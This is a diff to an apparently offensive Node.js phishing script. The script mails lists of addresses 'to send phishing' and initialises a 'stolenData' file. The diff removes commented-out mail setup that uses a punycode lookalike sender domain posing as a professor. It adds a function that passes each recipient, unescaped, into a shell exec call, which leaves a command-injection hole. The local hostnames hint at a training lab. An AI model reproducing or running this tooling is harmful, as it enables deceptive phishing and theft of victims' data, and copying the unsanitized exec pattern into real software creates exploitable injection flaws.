@@ -186,44 +186,26 @@ function sendMail(toBeSend)
     else if (Array.isArray(toBeSend)) {
         console.log("email addresses to send phishing: ", toBeSend);
         toBeSend.forEach(item => {
-            sendSingleMail(toBeSend);
+            sendSingleMail(item);
         });
     } else {
         console.error('Input must be a string or an array of strings.');
     }   
 }
 
-function sendSingleMail(mailAddress)
-{
-//       // Create a transporter using the host and port of your SMTP server
-//   let transporter = nodemailer.createTransport({
-//     host: 'smtp.units.local', // replace with your SMTP server host
-//     port: 25, // the port of your SMTP server
-//     secure: false, // true for 465, false for other ports
-//     // If needed, add authentication
-//     // auth: {
-//     //   user: 'username',
-//     //   pass: 'password'
-//     // }
-//   });
 
-//   // Define email options
-//   let mailOptions = {
-//     from: 'Professore <professore@xn--unts-mza.local>', // Sender address
-//     to: mailAddress, // Recipient address
-//     subject: 'Test Email', // Subject line
-//     text: 'Test email body' // Plain text body
-//   };
+async function sendSingleMail(recipient) {
+console.log("send mail to " + recipient);
+      var yourscript = exec(`./send_email.sh ${recipient}`,
+        (error, stdout, stderr) => {
+            console.log(stdout);
+            console.log(stderr);
+            if (error !== null) {
+                console.log(`exec error: ${error}`);
+            }
+        });
 
-//   // Send the email
-//   transporter.sendMail(mailOptions, (error, info) => {
-//     if (error) {
-//       return console.log(error);
-//     }
-//     console.log('Email sent: ' + info.response);
-//   });
 }
-
 /////////// MAIN //////////////////
 const emailAddress = process.argv[2]; 
 initializeJsonFile("stolenData/mail.json", emailAddress);
